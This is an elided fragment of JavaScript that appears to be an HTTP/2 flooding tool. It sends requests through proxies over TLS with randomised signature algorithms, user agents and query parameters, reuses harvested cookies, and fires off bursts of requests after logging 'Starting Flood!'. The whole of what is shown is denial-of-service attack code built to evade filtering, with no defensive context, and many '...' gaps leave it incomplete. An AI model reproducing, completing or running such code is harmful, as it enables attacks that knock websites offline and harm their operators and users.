...
const cipherList = [
    ...
    queryLists = ['s', 'q', 'query', 'search', 'fbclid', 'id', 'name', 'item', 'user', 'userid', 'email', 'price', 'amount', 'quarntity', '_', 'history', 'page', 'where', 'line']
        ...
        setInterval(() => {
            ...
            h1connection.on("connect", (_, socket) => {
                const http2session = http2.connect(parsed.href, {
                    createConnection: () => {
                        return tls.connect({
                            ...
                            sigalgs: sigals[Math.floor(Math.random() * sigals.length)],
                            agent: agent,
                ...
                http2session.on("connect", (_, tlsSocket) => {
                    ...
                    const http2requestfirst = http2session.request(Object.assign({
                    ...
                    http2requestfirst.on('error', () => { }).end()
                    .on('response', response => {
                        if (!cookie) cookie = response['set-cookie'] !== undefined ? String(response['set-cookie'].map(x => x.split(';')[0]).join('; ')).slice(0,-1) : undefined;
                        console.log("Status:",response[":status"],"Cookie:",cookie,"User-Agent:",randUserAgent,"Proxy:",proxy[0], "Starting Flood!")
                        ...
                        for (let i = 0; i < rpp; i++) {
                            ...
                            tlsSocket.setTimeout(30000);
                            tlsSocket.setEncoding("utf8");
                            const http2request = http2session.request(Object.assign({
                                ':authority': parsed.host,
                            ...
                            // http2request.end();
                            http2request.on('error', () => { }).end()
                            .on('response', response => {
                                http2request.close();
                                if (valueofgod >= Math.floor(rpp - 10)) {
